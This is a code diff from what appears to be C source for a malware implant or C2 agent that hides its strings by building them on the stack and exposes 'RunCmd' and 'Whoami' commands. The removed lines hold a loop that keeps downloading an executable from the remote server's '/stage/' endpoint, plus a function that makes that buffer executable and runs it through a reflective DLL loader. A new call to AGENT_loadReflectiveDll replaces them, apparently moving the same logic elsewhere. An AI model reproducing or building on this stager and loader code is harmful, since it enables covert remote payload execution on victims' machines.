@@ -21,82 +21,6 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-// TODO: replace the use of api as a parameter to different functions
-
-// TODO: Pass the name of the reflective loader as a parameter
-/*
-This function runs the function named "ReflectiveLoader" in a reflective dll
-execueRD uses GetRLOffset which looks for the name "ReflectiveLoader"
-
-Input:
-    [in] PAPI api: a pointer to the API struct
-
-    [in] PDLL: a pointer to the DLL struct that holds a reflective DLL
-
-Output:
-    Success -> HANDLE: handle to the new region the DLL has been written to, this handle needs to be freed
-
-    Failure -> NULL
-*/
-HANDLE executeRD(PAPI api, PDLL pDll)
-{
-    DWORD loaderOffset;
-    REFLECTIVELOADER pReflectiveLoader;
-    DLLMAIN pDllMain;
-
-    // get the offset of the reflective loader
-    loaderOffset = GetRLOffset(api, pDll->pBuffer);
-
-    #ifdef DEBUG
-    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
-    //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
-    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->pBuffer + loaderOffset);
-    #endif
-
-    // get the real address of the reflective loader, cast it to a function
-    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->pBuffer + loaderOffset);
-
-    // TODO: Revert PAGE_EXECUTE_READWRITE protections
-    // TODO: Use PAGE_EXECUTE_READ protections instead
-    DWORD dwOldProtect;
-    // give the memory region that holds the reflective loader execute-read-write permissions
-    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->pBuffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-
-    // run the reflective loader
-    // reflective loader returns an address to DLLMain, cast it to a function pointer
-    pDllMain = (DLLMAIN)pReflectiveLoader();
-
-    #ifdef DEBUG
-    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
-    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
-    #endif
-
-    HANDLE hDllBase = NULL;
-
-    if( pDllMain != NULL )
-    {
-        // call the loaded library's DllMain with DLL_QUERY_HMODULE to get its HMODULE (i.e. base address)
-        // https://stackoverflow.com/questions/9545732/what-is-hmodule
-        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
-        {
-            #ifdef DEBUG
-            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
-            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
-            #endif
-            hDllBase = NULL;
-        }
-    }
-    else
-    {
-    #ifdef DEBUG
-        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
-        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
-        #endif
-    }
-
-    return hDllBase;
-}
-
 void myMain()
 {
     Agent _agent = {0};
@@ -111,44 +35,9 @@ void myMain()
         DEBUG_PRINTF_ERROR("%s", "myMain: AgentPopulate failed\n");
     }
 
-    // downloaded DLL with the reflective loader in it
-    DLL primalDll = {.pBuffer = NULL, .Size = 0};
-    PDLL pPrimalDll = &primalDll;
-
-    #ifdef DEBUG
-    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
-    #endif
-    WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
-
-    //AGENT_downloadPrimalDll(pPrimalDll);
-
-    while (pPrimalDll->pBuffer == NULL)
-    {
-        pPrimalDll->pBuffer = httpGetExecutable(&agent->api, &pPrimalDll->Size, wcStageEndpoint, agent->_remoteServer, agent->_remotePort);
-        ((SLEEP)agent->api.Sleep)(5000);
-        if (pPrimalDll->pBuffer != NULL)
-        { break; }
-        #ifdef DEBUG
-        ((MESSAGEBOXA)agent->api.MessageBoxA)(0, msg, msg, 0X0L);
-        #endif
-    }
-
-    #ifdef DEBUG
-    CHAR ntHeader_f[] = { '1', 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0};
-    // e_lfanew = offset to nt headers
-    ((PRINTF)agent->api.printf)(ntHeader_f, (UINT_PTR)(pPrimalDll->pBuffer) + ((PIMAGE_DOS_HEADER)pPrimalDll->pBuffer)->e_lfanew);
-    #endif
-
-    DLL esgStdDll;
+    // TODO: Implement IoC by using function callbacks as parameters so that the only function that I need to run is loadReflectiveDll to load any DLL I want
+    DLL esgStdDll = AGENT_loadReflectiveDll(agent);
     PDLL pEsgStdDll = &esgStdDll;
-    pEsgStdDll->pBuffer = NULL;
-
-    // the DLL is in its prime form after running the reflective loader
-    pEsgStdDll->pBuffer = executeRD(&agent->api, pPrimalDll);
-
-    // free the previous DLL
-    ((FREE)agent->api.free)(pPrimalDll->pBuffer);
-    pPrimalDll->pBuffer = NULL;
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
